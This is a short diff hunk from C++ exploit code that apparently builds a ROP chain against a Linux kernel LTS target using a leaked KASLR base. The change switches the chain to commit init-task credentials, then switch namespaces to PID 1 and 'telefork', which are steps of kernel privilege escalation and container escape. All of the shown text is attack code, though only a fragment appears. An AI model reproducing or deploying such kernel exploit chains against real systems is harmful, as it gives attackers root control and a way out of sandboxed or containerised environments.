@@ -70,7 +70,7 @@ public:
         auto target = lts6181;
 
         RopChain rop(target, kaslr_base);
-        rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
+        rop.AddRopAction(RopActionId::COMMIT_INIT_TASK_CREDS);
         rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, { 1 });
         rop.AddRopAction(RopActionId::TELEFORK, { 5000 });
 
